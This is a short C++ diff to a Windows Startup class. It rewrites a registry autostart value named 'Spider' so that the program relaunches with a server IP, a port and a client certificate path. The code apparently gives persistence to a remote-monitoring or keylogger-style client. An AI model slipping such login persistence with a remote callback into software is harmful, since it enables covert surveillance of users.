@@ -39,7 +39,7 @@ int			Startup::isStartup() const
 	return (1);
 }
 
-void		Startup::addStartup()
+void		Startup::addStartup(const std::string& ip, const std::string& port)
 {
 	HKEY	hkey;
 
@@ -55,7 +55,32 @@ void		Startup::addStartup()
 
 	RegDeleteValue(hkey, L"Spider");
 
-	if (RegSetValueEx(hkey, L"Spider", 0, REG_SZ, (LPBYTE)_wappPath.data(), _wappPath.size() * sizeof(WCHAR) + 1)) {
+	std::wstring fullCommand(_wappPath);
+	std::wstring tmp;
+	tmp += L" ";
+	tmp.append(ip.begin(), ip.end());
+	tmp += L" ";
+	tmp.append(port.begin(), port.end());
+
+	try {
+		HMODULE hModule = GetModuleHandleW(NULL);
+		WCHAR path[MAX_PATH];
+		GetModuleFileNameW(hModule, path, MAX_PATH);
+		std::wstring wpath(path);
+		std::string spath;
+
+		spath.append(wpath.begin(), wpath.end());
+		spath = spath.substr(0, spath.find_last_of("\\") + 1);
+		spath.append("client.crt");
+		std::cout << spath.c_str() << std::endl;
+		tmp += L" ";
+		tmp.append(spath.begin(), spath.end());
+	}
+	catch (std::exception& e) { (void)e; }
+
+	fullCommand.append(tmp);
+
+	if (RegSetValueEx(hkey, L"Spider", 0, REG_SZ, (LPBYTE)fullCommand.data(), fullCommand.size() * sizeof(WCHAR) + 1)) {
 		std::cerr << "Can't set Key";
 	}
 }
